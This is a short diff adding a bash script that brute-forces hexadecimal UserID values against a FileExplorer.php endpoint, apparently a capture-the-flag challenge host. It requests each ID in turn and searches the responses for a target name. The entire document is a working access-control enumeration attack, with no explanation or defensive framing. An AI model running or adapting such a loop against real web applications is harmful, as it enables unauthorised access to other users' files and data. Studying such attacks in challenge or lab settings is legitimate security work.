@@ -1,0 +1,6 @@
+for dec in {23061..100000}
+do
+hex=$(printf "%x" $dec)
+echo ${hex^^}
+curl https://ccc-wm05.allyourbases.co/FileExplorer.php?UserID=${hex^^}|grep Keri
+done
